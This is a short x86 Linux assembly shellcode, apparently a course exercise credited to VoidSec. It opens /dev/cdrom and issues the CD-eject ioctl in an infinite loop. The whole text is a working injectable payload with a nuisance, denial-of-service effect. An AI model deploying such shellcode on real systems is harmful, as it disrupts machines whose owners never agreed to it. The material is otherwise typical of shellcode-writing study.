; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

push 0x5 
pop eax
xor ecx,ecx 
push ecx
mov ch, 0x8 
mov edi, 0x6d6f7264
push edi
mov edi, 0x632f7665
push edi
mov edi, 0x642f2f2f
push edi
mov ebx, esp 
int 0x80
xchg eax, ebx
mov cx, 0x5309
openit:
 push 0x36
 pop eax 
 int 0x80 
 jmp openit